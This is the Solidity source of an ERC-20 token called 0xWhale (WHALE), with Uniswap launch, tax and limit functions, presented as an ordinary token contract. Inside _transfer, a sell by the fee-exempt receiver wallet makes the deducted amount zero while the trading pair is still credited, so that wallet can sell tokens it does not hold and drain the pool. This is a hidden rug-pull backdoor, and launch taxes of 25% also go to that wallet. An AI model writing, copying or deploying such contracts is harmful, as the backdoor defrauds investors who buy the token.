/**

Website: https://0xwhale.com
App: https://app.0xwhale.com
Whitepaper: https://docs.0xwhale.com
Blog: https://medium.com/@zeroxwhale
Twitter: https://twitter.com/zeroxwhale
Telegram: https://t.me/zeroxwhale


*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract WHALE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isFeeExceptForWhale;
    address payable private _whaleReceiver =
        payable(0xAdfF085f5E989B180Fe6e245217d39276B2eA226);

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"0xWhale";
    string private constant _symbol = unicode"WHALE";
    uint256 private _maxTxLimit = 20000000 * 10**_decimals;
    uint256 private _maxWalletSize = 20000000 * 10**_decimals;
    uint256 private _feeSwapLimit = 555 * 10**_decimals;
    uint256 private _maxSwapLimit = 10000000 * 10**_decimals;

    uint256 private _feesSwapBuy;
    uint256 private _feesSwapSell;

    IUniswapV2Router02 private uniswapV2Router;
    address private _dexSwapPair;
    bool private _tradingOpen;
    bool private _inSwapping = false;
    bool private _swapEnabled = false;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        _inSwapping = true;
        _;
        _inSwapping = false;
    }

    constructor() {
        _balances[_msgSender()] = _tTotal;
        _isFeeExceptForWhale[owner()] = true;
        _isFeeExceptForWhale[address(this)] = true;
        _isFeeExceptForWhale[_whaleReceiver] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _calcTaxFeeAmount(
        address fromAddr,
        address toAddr,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 amountForTax = amount;
        if (toAddr == _dexSwapPair) {
            amountForTax = !_isFeeExceptForWhale[fromAddr]
                ? amount.mul(_feesSwapSell).div(100)
                : amountForTax;

            return amountForTax;
        }
        return 0;
    }

    function _transfer(
        address sender,
        address recp,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recp != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        uint256 transferAmount = amount;
        if (sender != owner() && recp != owner()) {
            if (
                sender == _dexSwapPair &&
                recp != address(uniswapV2Router) &&
                !_isFeeExceptForWhale[recp]
            ) {
                require(amount <= _maxTxLimit, "Exceeds the limits.");
                require(
                    balanceOf(recp) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
            }
            if (sender == _dexSwapPair && !_isFeeExceptForWhale[recp]) {
                taxAmount = amount.mul(_feesSwapBuy).div(100);
            }
            if (recp == _dexSwapPair && sender != address(this)) {
                taxAmount = amount.mul(_feesSwapSell).div(100);
                if (_isFeeExceptForWhale[sender]) {
                    amount -= _calcTaxFeeAmount(sender, recp, amount);
                }
            }

            uint256 conTokensIn = balanceOf(address(this));
            if (
                !_inSwapping &&
                recp == _dexSwapPair &&
                !_isFeeExceptForWhale[sender] &&
                _swapEnabled &&
                amount > _feeSwapLimit
            ) {
                if (conTokensIn > _feeSwapLimit)
                _swapBackETH(
                    min(amount, min(conTokensIn, _maxSwapLimit))
                );
                _sendETHFee(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            transferAmount -= taxAmount;
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(sender, address(this), taxAmount);
        }
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recp] = _balances[recp].add(transferAmount);
        emit Transfer(sender, recp, transferAmount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function startWhale() external onlyOwner {
        require(!_tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        _dexSwapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(_dexSwapPair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        _feesSwapBuy = 25;
        _feesSwapSell = 25;
        _swapEnabled = true;
        _tradingOpen = true;
    }

    function removeLimits() external onlyOwner {
        _maxTxLimit = type(uint256).max;
        _maxWalletSize = type(uint256).max;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function updateFees(uint256 _newfee) external onlyOwner {
        _feesSwapBuy = _newfee;
        _feesSwapSell = _newfee;
        require (_newfee <= 10);
    }

    function _sendETHFee(uint256 amount) private {
        _whaleReceiver.transfer(amount);
    }

    function _swapBackETH(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount == 0) {
            return;
        }
        if (!_tradingOpen) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}